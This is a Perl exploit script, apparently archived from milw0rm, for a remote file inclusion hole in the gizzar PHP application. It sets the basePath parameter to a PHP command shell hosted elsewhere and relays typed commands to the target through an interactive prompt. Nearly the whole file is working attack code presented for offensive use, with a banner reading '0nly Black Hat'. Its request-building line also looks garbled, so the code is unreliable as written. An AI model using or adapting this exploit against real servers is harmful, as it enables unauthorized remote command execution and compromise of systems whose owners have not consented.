#!/usr/bin/perl
#gizzar --Remote File Inclusion Vulnerablity
#Class = Remote File Inclusion
#Bug Found & Exploit [c]oded By  DeltahackingTEAM      (Dr.Trojan&Dr.Pantagon)
#Download:http://switch.dl.sourceforge.net/sourceforge/gizzar/gizzar-03162002.tar.gz
#Vulnerable
#Code:include_once($basePath."include/config.php")&include_once($basePath."include/access.php")
#exploit: http://[site]/gizzar/index.php?basePath=http://yourscript

use LWP::UserAgent;

$target=@ARGV[0];
$shellsite=@ARGV[1];
$cmdv=@ARGV[2];

if($target!~/http:\/\// || $shellsite!~/http:\/\// || !$cmdv)
{
       usg()
}
header();


while()
{
print "[Shell] \$";
while (<STDIN>)
{
       $cmd=$_;
       chomp($cmd);

$xpl = LWP::UserAgent->new() or die;
$req = HTTP::Request->new(GET=>$target.'/index.php?basePath='.$shellsite='.?&'.$cmdv.'='.$cmd) or die "\n\n Failed to Connect, Try again!\n";
$res = $xpl->request($req);
$info = $res->content;
$info =~ tr/[\n]/[&#234;]/;


if (!$cmd) {
print "\nEnter a Command\n\n"; $info ="";
}
elsif ($info =~/failed to open stream: HTTP request failed!/ || $info =~/:
Cannot execute a blank command in <b>/)
{
print "\nCould Not Connect to cmd Host or Invalid Command Variable\n";
exit;
}


elsif ($info =~/^<br.\/>.<b>Warning/) {
print "\nInvalid Command\n\n";
};


if($info =~ /(.+)<br.\/>.<b>Warning.(.+)<br.\/>.<b>Warning/)
{
$final = $1;
$final=~ tr/[&#234;]/[\n]/;
print "\n$final\n";
last;
}

else {
print "[shell] \$";
}
}
}
last;



sub header()
{
print q{
*******************************************************************************
         ***(#$#$#$#$#$=>http://www.deltasecurity.ir<=#$#$#$#$#$)***

Vulnerablity found By: DeltahackingTEAM

Exploit [c]oded By: Dr.Trojan

Dr.Trojan,HIV++,D_7j,Lord,VPc,IMpostor,Dr.Pantagon

http://advistory.deltasecurity.ir

We Server(99/999% Secure) <<<<<www.takserver.ir>>>>>

Email:Dr.Trojan[A]deltasecurity.ir 0nly Black Hat
******************************************************************************
}
}
sub usg()
{
header();
print q{
Usage: perl delta.pl [tucows fullpath] [Shell Location] [Shell Cmd]
[gizzar FULL PATH] - Path to site exp. www.site.com
[shell Location] - Path to shell exp. d4wood.by.ru/cmd.gif
[shell Cmd Variable] - Command variable for php shell
Example: perl delta.pl http://www.site.com/[gizzar]/
********************************************************************************
};

exit();
}

# milw0rm.com [2006-12-09]